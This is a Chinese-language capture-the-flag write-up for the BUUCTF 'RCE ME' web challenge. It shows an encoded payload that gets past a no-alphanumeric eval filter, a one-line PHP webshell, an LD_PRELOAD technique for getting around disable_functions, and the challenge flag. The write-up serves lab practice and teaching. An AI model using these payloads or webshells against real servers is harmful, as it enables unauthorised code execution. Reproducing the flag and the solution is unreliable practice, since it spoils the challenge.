---
title: 极客大挑战 2019 RCE ME
categories: ['DROPS']
tags: ['Web','BUUCTF_Web','RCE','disable_function绕过']
cover: https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201120232544.png
date: 2020-12-5 20:42:00
---

# [极客大挑战 2019]RCE ME

源码：

```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

分析一波，GET请求获得`code`，想要通过的话需要绕过两个检测：

1. payload长度小于40
2. 不能包含`a-z、A-Z、0-9`

和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，这次摸到了相关文章：[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)。

使用`url编码`+`~`取反构造不可见字符串，然后加上php7版本以后支持了使用：`($a)()`这样的方法动态执行函数，所以我们可以构造payload：`assert(eval($_POST[‘a’]))`

先构造`assert`：

```
echo urlencode(~'assert');

//结果：%9E%8C%8C%9A%8D%8B
```

再构造`eval($_POST['a'])`：

```
echo urlencode(~'eval($_POST[\'a\'])');

//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
```

完整payload：

```
?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
```

网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的`~`取反再获得真正的函数名。

使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是`ELF`是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回`ret=127`：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png)

搜索了一波，原来是是**disable_function**搞的鬼，这个表可以在phpinfo()中查看：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png)

因为`system`、`exec`、`shell_exec`等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过**disable_function**的方法，网上有很多其他方法，其中一个方法：

**利用环境变量LD_PRELOAD来绕过**

>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的
>
> 
>
>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

正好蚁剑的插件中就有一个名为：[as_bypass_php_disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions)的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png)

插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的`/var/www/html`目录是没有上传权限的，我右键以后发现能修改权限，改成0777：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png)

>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。

上传一句话木马233.php：

```
<?php
@eval($_POST['b']);
```

再用一句话木马的shell执行插件：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png)

进入shell，目录下面多了一个名为**\.antproxy.php**的文件：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png)

再使用蚁剑连接**\.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png)

flag{a216900e-2427-48f7-9323-f65d0a3abdbf}

